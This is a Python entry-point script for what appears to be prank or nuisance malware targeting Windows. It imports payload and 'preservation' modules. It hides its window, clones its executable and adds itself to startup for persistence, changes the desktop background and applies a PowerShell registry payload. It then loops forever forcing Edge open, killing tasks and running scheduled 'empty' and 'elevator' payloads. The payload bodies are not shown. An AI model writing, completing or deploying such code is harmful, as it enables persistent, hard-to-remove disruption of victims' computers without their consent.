import schedule
import time

import threading

import playsound as ps

# Custom scripts
from constants import NAME
from preservation import hide, cloneExe, addStartup
from payload import empty, elevator, edgeForcer, killTask, changeBackground
from powershellpayload import registryPayload

# Scheduled events - run periodically
schedule.every(5).seconds.do(empty)
schedule.every(60).seconds.do(elevator)

def main(): 
    hide()

    pathTo = cloneExe(NAME)

    # If there is already a shortcut (i.e. program is run on subsequent computer startups)
    if addStartup(pathTo):
        try:
            ps.playsound('https://www.redringtones.com/wp-content/uploads/2017/03/windows-xp-startup-sound.mp3', False)
        except:
            pass

    changeBackground()
    registryPayload()

    while True:
        schedule.run_pending()
        thread = threading.Thread(target=edgeForcer)
        thread.start()
        thread.join()

        thread = threading.Thread(target=killTask)
        thread.start()
        thread.join()
        
        time.sleep(1)


if __name__ == "__main__":
    main()
